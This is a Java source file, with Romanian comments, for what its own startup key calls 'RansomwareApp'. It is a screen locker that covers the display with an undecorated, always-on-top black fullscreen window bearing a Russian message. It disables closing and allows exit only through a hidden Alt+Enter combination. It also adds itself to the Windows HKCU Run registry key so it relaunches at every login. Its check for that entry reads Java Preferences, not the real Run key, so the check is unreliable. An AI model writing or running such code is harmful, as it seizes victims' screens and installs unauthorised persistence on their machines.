import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.util.prefs.Preferences;

class FullscreenApp {

    // Cheia pentru configurare startup
    private static final String STARTUP_KEY = "RansomwareApp";

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            JFrame frame = new JFrame("Simulare Fullscreen");

            // Configurarea ferestrei principale
            frame.setUndecorated(true); // Fără bară de titlu
            frame.setExtendedState(JFrame.MAXIMIZED_BOTH); // Fullscreen
            frame.setAlwaysOnTop(true); // Mereu deasupra
            frame.getContentPane().setBackground(Color.BLACK);

            // Mesajul afișat (modificat)
            JLabel message = new JLabel("Счастливых Вам Голодных игр и пусть удача всегда будет с вами", JLabel.CENTER);
            message.setForeground(Color.WHITE);
            message.setFont(new Font("Arial", Font.PLAIN, 24));
            message.setHorizontalAlignment(SwingConstants.CENTER);
            frame.add(message);

            // Adăugarea unui ascultător de evenimente pentru combinația de taste Alt + Enter
            KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
                if (e.getID() == KeyEvent.KEY_PRESSED) {
                    if (e.getKeyCode() == KeyEvent.VK_ENTER && e.isAltDown()) {
                        // Elimină fereastra de notificare, doar ieși din aplicație fără confirmare
                        System.exit(0);
                    }
                }
                return false;
            });

            // Adăugarea aplicației în startup, dacă nu este deja
            if (!isAddedToStartup()) {
                addToStartup();
            }

            frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE); // Dezactivăm închiderea implicită
            frame.setVisible(true);
        });
    }

    // Metodă pentru a adăuga aplicația în startup
    private static void addToStartup() {
        try {
            String command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + STARTUP_KEY + " /t REG_SZ /d " + getExecutablePath() + " /f";
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(null, "Eroare la adăugarea în startup: " + e.getMessage(), "Eroare", JOptionPane.ERROR_MESSAGE);
        }
    }

    // Verificarea dacă aplicația este deja în startup
    private static boolean isAddedToStartup() {
        try {
            Preferences preferences = Preferences.userRoot().node("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
            String value = preferences.get(STARTUP_KEY, null);
            return getExecutablePath().equals(value);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    // Obținerea căii către fișierul executabil
    private static String getExecutablePath() {
        try {
            return new File(FullscreenApp.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getPath();
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }
}
